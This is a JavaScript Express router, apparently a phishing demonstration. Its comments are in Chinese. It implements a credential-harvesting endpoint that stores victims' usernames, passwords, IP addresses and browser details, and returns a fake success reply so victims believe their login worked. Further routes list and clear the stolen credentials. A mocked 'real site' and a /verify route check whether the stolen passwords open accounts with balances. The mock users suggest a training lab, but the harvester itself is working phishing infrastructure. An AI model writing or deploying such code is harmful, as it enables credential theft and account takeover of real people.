import { Router } from 'express'

const router = Router()

// 存储被钓鱼的凭证
const stolenCredentials = []

// 模拟真实网站的用户
const realUsers = {
  'zhangsan': { password: 'zhang123', balance: 50000 },
  'lisi': { password: 'li456', balance: 30000 }
}

// ==================== 钓鱼接口 ====================

// 钓鱼页面提交的凭证
router.post('/steal', (req, res) => {
  const { username, password, source } = req.body
  
  const credential = {
    id: Date.now(),
    username,
    password,
    source: source || '未知来源',
    ip: req.ip,
    userAgent: req.get('User-Agent'),
    time: new Date().toLocaleString('zh-CN')
  }
  
  stolenCredentials.push(credential)
  
  console.log('\n🎣 ========== 钓鱼成功 ==========')
  console.log(`用户名: ${username}`)
  console.log(`密码: ${password}`)
  console.log(`来源: ${source}`)
  console.log(`时间: ${credential.time}`)
  console.log('=================================\n')
  
  // 返回成功，让受害者以为登录成功
  res.json({ success: true })
})

// 获取被窃取的凭证列表
router.get('/credentials', (req, res) => {
  res.json(stolenCredentials.slice(-50).reverse())
})

// 清空凭证
router.delete('/credentials', (req, res) => {
  stolenCredentials.length = 0
  res.json({ success: true })
})

// ==================== 模拟真实网站 ====================

// 真实网站登录
router.post('/real/login', (req, res) => {
  const { username, password } = req.body
  const user = realUsers[username]
  
  if (user && user.password === password) {
    res.json({ 
      success: true, 
      message: '登录成功',
      user: { username, balance: user.balance }
    })
  } else {
    res.json({ success: false, message: '用户名或密码错误' })
  }
})

// 验证被盗凭证是否有效
router.post('/verify', (req, res) => {
  const { username, password } = req.body
  const user = realUsers[username]
  
  if (user && user.password === password) {
    res.json({ 
      valid: true, 
      message: '凭证有效！可以登录真实账户',
      balance: user.balance
    })
  } else {
    res.json({ valid: false, message: '凭证无效' })
  }
})

export default router
